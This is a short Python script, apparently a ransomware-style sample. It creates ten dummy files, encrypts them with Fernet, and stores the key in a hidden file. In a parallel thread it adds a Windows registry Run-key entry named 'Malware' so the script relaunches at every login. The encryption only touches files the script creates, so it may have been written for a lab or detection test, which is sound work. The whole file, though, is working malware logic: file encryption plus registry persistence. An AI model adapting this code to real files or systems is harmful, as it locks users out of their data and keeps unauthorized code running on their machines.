import os
import threading
from cryptography.fernet import Fernet
import subprocess

def encrypt_files():
    key = Fernet.generate_key()
    cipher = Fernet(key)
    with open(".encryption_key", "wb") as f:
        f.write(key)

    os.makedirs("files_to_encrypt", exist_ok=True)
    for i in range(10):
        file_path = f"files_to_encrypt/file_{i}.txt"
        with open(file_path, "w") as f:
            f.write("Confidential data.")
        with open(file_path, "rb") as f:
            encrypted_data = cipher.encrypt(f.read())
        with open(file_path, "wb") as f:
            f.write(encrypted_data)
    print("Files encrypted.")

def establish_persistence():
    reg_command = f'reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v "Malware" /t REG_SZ /d "{os.path.abspath(__file__)}" /f'
    subprocess.run(reg_command, shell=True)
    print("Registry persistence established.")

if __name__ == "__main__":
    threads = [
        threading.Thread(target=encrypt_files),
        threading.Thread(target=establish_persistence)
    ]
    for t in threads:
        t.start()
    for t in threads:
        t.join()
